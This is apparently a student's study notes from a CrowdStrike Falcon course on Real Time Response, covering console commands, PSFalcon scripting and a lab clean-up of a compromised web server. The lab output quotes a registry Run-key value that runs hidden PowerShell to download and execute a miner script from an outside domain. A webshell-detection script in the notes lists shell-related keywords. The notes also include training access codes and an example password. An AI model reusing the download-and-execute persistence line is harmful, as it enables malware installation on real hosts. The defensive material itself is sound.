---
aliases:
tags:
source:
desc:
references:
title: 240 - Investigating and Mitigating Threats with Real Time Response
---

Use the following for Falcon Encounter: 
URL: https://falcon.events/training
Access Code: t5n1
Passphrase: connect

My Email: steven.fox1@crowdstrike.com

![[FALCON240_command-help.pdf]]

alias - Nix Swan


- rtr runs in the context of system/root
- **its not a shell**, just a command line like interface
- mac - root folder is read only
- CsWinDiag - troubleshoot falcon
- host = the endpoint the falcon sensor is installed on
- rtr console = where you control rtr
- session = individual session to a host using the rtr console
- falcon scripts are not editable
- timeout after 10 minutes of inactivity
	- if you reconnect before 5 minutes, you may get the old session
- you need to konw about admin functions because you need to know when you are going to need admin privs
- rtr roles
- `help` will show you the commands you can execute
	- `help <command> <subcommand>`
- Locate docs in Falcon: https://falcon.crowdstrike.com/documentation/71/real-time-response-and-network-containment#real-time-response
- Commands supported and what they do: https://falcon.crowdstrike.com/documentation/71/real-time-response-and-network-containment#rtr_commands
- policies are platform specific and can customize which rtr commands are available
	- eg. pci machines may not allow memdump
	- rtr can be completely disabled so check policies
- high risk commands
	- get
	- put
	- run
	- put-and-run
	- memdump
	- xmemdump
- mfa can be enabled 
	- RTR MFA Documentation: https://falcon.crowdstrike.com/documentation/page/b8c1738c/real-time-response#zf5b10fa
- `cat sysinfo.log 1000` limits the response to 1000 bytes (1kb)
- `map z: \\IR\Collection Administrator "Password!!"` map a network drive with user Administrator and password of "Password!!"
	- verify using `mount`  
```sh
C:\inetpub\wwwroot\a> map z: \\IR\Collection Administrator "Password!!"
C:\inetpub\wwwroot\a> mount
Name Used (GB) Free (GB) Root           
---- --------- --------- ----           
C    17.317    12.681    C:\            
Z    19.511    10.487    \\IR\Collection
```
- zip up a directory
	- `zip "c:\inetpub\wwwroot\" c:\temp\bad.zip`
- rename a file using the `mv` command
	- `mv upload.php upload.php.vulnerable
- get the hex of venom.exe but only show 24 characters starting from offset 1000
	- `cat venom.exe 24 1000 -showhex`
- get a hile hash using `filehash`
	- 
```shell
Filename : C:\inetpub\wwwroot\venom.exe
MD5      : CA3926DC6C4B2A71832A03FBA366CBCD
SHA1     : A81F4B43ECF32C7824DFA7CAA603A799104C4FD4
SHA256   : 5B8F6D76E9F63920654266814DAA12E80AD13CF07E87C29A9A8E167A7BF4EA4A
	  ```
`
- `encrypt` a file so you can transfer it without accidently executing
	- 
```shell
C:\inetpub\wwwroot> encrypt venom.exe
FullName      : C:\inetpub\wwwroot\venom.exe.AES
Plaintext Key : /1ZiX/f3eTdP4owQnBHDQzp0PYjKgTbAoAjLt2Lr/gM=
Algorithm     : AES
CipherMode    : CBC
PaddingMode   : PKCS7	  
```
- read the registry `reg query hklm\software\microsoft\windows\currentversion\run`
	- the result uses ASEP. The "run" key that we queried is an ASEP value, or an autorun. Anytime anyone logs into this computer, the entry here will execute. Specifically, this will download the xminer.ps1 script from the malicious domain and execute it again. This is a persistence mechanism. It reruns the attack, making sure it has all that it needs every single time the host is logged into.
```
C:\wallet> reg query hklm\software\microsoft\windows\currentversion\run
Properties of (hklm\software\microsoft\windows\currentversion\run) :

Property   Type Value                                                                                                                                 
--------   ---- -----                                                                                                                                 
xMiner   String C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('http://meatalk.com:8080/xminer.ps1'))	  
```
-  delete the item from registry
	- `reg delete hklm\software\microsoft\windows\currentversion\run xMiner`
- list users `ls c:\users`
- security identifier for user miner `getsid miner`
- get list of logged in users `reg query hku`
- `ps` list processes
- take memory dump of process
	- `memdump 2636 Z:\cmd-for-analysis.dmp`
- delete a directory using `rm <path> -force`
	- `rm c:\wallet -force`

- scripts
	- language
		- zsh mac
		- bash linux
		- powershell windows
			- write-host doesnt always work
				- `get-something | format-list | out-string`
			- 
	- non interactive
	- if long running it might get killed by powershell timeout
	- falcon scripts
		- written by crowdstrike
	- custom scripts
		- written by us
		- to execute
			- raw
				- needs triple backticks for code blocks
				- single user, on the fly
				- `runscript -Raw ```magic here````
				- `runscript -raw ```get-childitem c:\inetpub\wwwroot | out-string```
			- cloud file
				- script already saved in repository
				- regular tasks
				- `runscript -CloudFile="myscript"`
			- host path
				- the script lives on the endpoint
				- use `put`, then execute
				- get around script sizes (approx 40kb)
				- `runscript -HostPath=c:\temp\getprocess.ps1`
	- script timeout is 60 seconds unless use `-timeout`
	- batch session over api has a max timeout of 10 mins
- psfalcon
	- https://github.com/CrowdStrike/psfalcon
	- there is a free module 176 understanding the basics of psfalcon?
	- https://github.com/CrowdStrike/psfalcon/wiki/Get-FalconHost#finding-hosts-based-on-multiple-query-criteria
	- https://github.com/CrowdStrike/psfalcon/wiki/Invoke-FalconRtr
	- `queueoffine` means it will run as soon as it comes online
	- https://www.reddit.com/r/crowdstrike
	- https://github.com/CrowdStrike/psfalcon/wiki
	- https://github.com/CrowdStrike/psfalcon/discussions
	- example calling saved rtr query "Webshell Patterns"
	  
```shell

####################################
#Webshell Patterns - SAVED IN RTR
#Get the sites virtual directory, shows where directory is 
$webroot = 'C:\inetpub\wwwroot'
$anomalies = @();
# 1 to 3 character files - aaa.php or aa.php or a.php. ^[a-zA-Z\d]{1,3}\.[A-Z]{1,4}
$anomalies += gci -path $webroot -Recurse -EA 0 -Force | ?{ $_.Name -match '^[a-zA-Z\d]{1,3}\.(asp|aspx|php|log)$' } | select -exp fullname
# files < 50 KB
$anomalies += gci -path $webroot -include *.aspx,*.php,*.asp -Recurse -EA 0 -Force | ?{$_.length -lt 50000} | select -exp fullname
# 1 to 3 character directories
$anomalies += gci -path $webroot -Recurse -Directory -EA 0 -Force | ?{ $_.Name -match '^[a-zA-Z\d]{1,3}$' } | select -exp fullname
# Executable files
$anomalies += gci -path $webroot -Recurse -EA 0 -Force | ?{ $_.Name -match '^.*\.exe$' } | select -exp fullname
# All Webfiles
# $anomalies += gci -path $webroot -include *.aspx,*.php,*.asp -Recurse -EA 0 -Force | select -exp fullname
echo "Anomalies found:"
$anomalies | Sort-Object -Unique
echo ""
ForEach ($s in $anomalies) {
    If ($s -like "*.php") {
        If (get-Content $s | Select-String -pattern 'unsafe|eval|_POST|cmdshell|cmd|runat|VirtualAlloc')
        # Examples to use -             passthru|exec|eval|shell_exec|assert|str_rot13|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|gzdeflate|base64
        {
            echo $s
            echo "[+] POSSIBLE FOUND SHELL"
        }
    }
}
####################################

 ############################################# 
 ##     Run a Saved Script via PSFalcon     ## 
 ############################################# 
 # run locally
 #####-----Do not edit this section------##### 
 # Ensure that we have an authorization token 
 Get-240Token 
 # Get our host's AID 
 $alias = Get-Content C:\Software\alias.txt 
 $aid = Get-FalconHost -Filter "hostname:'$alias*'" 
  
 #####-------Begin Exercise Below-------##### 
 # Modify the below variables as directed 
  
 ## STEP 1 ## 
 # First, we need to set the command we're going to run. Add the command between the quotation marks below (e.g., if the command is help, $cmd = "help") 
 # What command is used to run a script? 
 $cmd = "runscript" 
  
 ## STEP 2 ## 
 # Next, we define our arguments. We are going to run a CloudFile script. Modify the variable below to use the correct argument flag. 
 #$argument = "-CHANGEME='Webshell Patterns'" 
 $argument = "-CloudFile='Webshell Patterns'"
 # For the above variable, make sure to NOT modify the script name or the quotation mark pattern. Reference your lab guide for help. 
  
 ## STEP 3 ## 
 # We also want to override the timeout to only wait 60 seconds. Set the variable below to 60. 
 $timeout = 60 
  
 ## STEP 4 ## 
 # Now, we can use the Invoke-FalconRtr command to establish our RTR session and run the command. No edits are necessary here. 
 Invoke-FalconRtr -Command $cmd -Arguments $argument -Timeout $timeout -HostId $aid 
  
 ## STEP 5 ## 
 # Save the script by going to File > Save. Then, go to Debug > Run/Continue to run your script. 
 # Use the output to answer the questions in your lab guide.  



####################################
##OUTPUT
####################################

 aid              : 1e5c11b5352e4ac98c45eb179146d215
session_id       : ac6c446f-83d6-46e5-86c2-d74b3a3bb2a6
offline_queued   : False
cloud_request_id : 6bef67f1-4641-43af-8d29-f8e5c488cf7e
complete         : True
stdout           : Anomalies found:
                   C:\inetpub\wwwroot\a
                   C:\inetpub\wwwroot\a\qfe.log
                   C:\inetpub\wwwroot\a\svc.log
                   C:\inetpub\wwwroot\AdFind.exe
                   C:\inetpub\wwwroot\logoff.php
                   C:\inetpub\wwwroot\nc.exe
                   C:\inetpub\wwwroot\upload.php
                   C:\inetpub\wwwroot\venom.exe
                   
                   C:\inetpub\wwwroot\logoff.php
                   [+] POSSIBLE FOUND SHELL
                   C:\inetpub\wwwroot\upload.php
                   [+] POSSIBLE FOUND SHELL 



```
- rtr worklows
	- if there are any errors further steps are not executed
- custom ioa's
  ![[Pasted image 20251014151022-20260125162333549.png]]









---
Related notes based on filename
```dataviewjs
const root = dv.current().file.name;

const pages = dv.pages("")
  .where(p => p.file.name.startsWith(root + "-"))
  .sort(p => p.file.name);

const tree = {};

for (const p of pages) {
  const parts = p.file.name.replace(root + "-", "").split("-");

  const child = parts[0];
  const grandchild = parts.slice(1).join("-");

  if (!tree[child]) tree[child] = { node: null, children: [] };

  if (parts.length === 1) {
    tree[child].node = p;
  } else {
    tree[child].children.push(p);
  }
}

const output = [];

for (const key of Object.keys(tree)) {
  const entry = tree[key];

  if (entry.node) {
    output.push(`- ${entry.node.file.link}`);

    for (const gc of entry.children) {
      output.push(`  - ${gc.file.link}`);
    }
  }
}

dv.paragraph(output.join("\n"));
```





